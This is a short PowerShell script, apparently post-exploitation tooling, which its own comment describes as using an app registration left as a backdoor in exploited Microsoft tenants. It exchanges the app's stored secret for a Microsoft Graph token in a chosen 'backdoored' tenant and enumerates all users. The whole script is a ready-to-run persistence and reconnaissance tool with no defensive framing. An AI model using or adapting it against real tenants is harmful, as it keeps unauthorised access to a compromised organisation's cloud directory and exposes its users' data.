# App used se backdoor in exploited tenants
$appId = "AppID" # AppId
$appSecret = "AppSecret" # AppSecret
$backdooredTenant = "TargetTenantId" # Tenant ID of backdoored tenant to access


function Get-AccessTokenForApp {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$appId,
        [Parameter(Mandatory=$true)]
        [string]$appSecret,
        [Parameter(Mandatory=$true)]
        [string]$tenantId
    )    

    $params = @{                
        Uri    = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
        Method = "POST"
        Body   = @{
            client_id     = $appId
            client_secret = $appSecret
            grant_type    = "client_credentials"
            scope         = "https://graph.microsoft.com/.default"
        }
    }
    $response = Invoke-RestMethod @params
    return $response.access_token    
}

$token = Get-AccessTokenForApp -appId $appId -appSecret $appSecret -tenantId $backdooredTenant

$secureToken = ConvertTo-SecureString $token -AsPlainText -Force
Connect-MgGraph -AccessToken $secureToken -NoWelcome

Get-MgUser -All | Select DisplayName, Id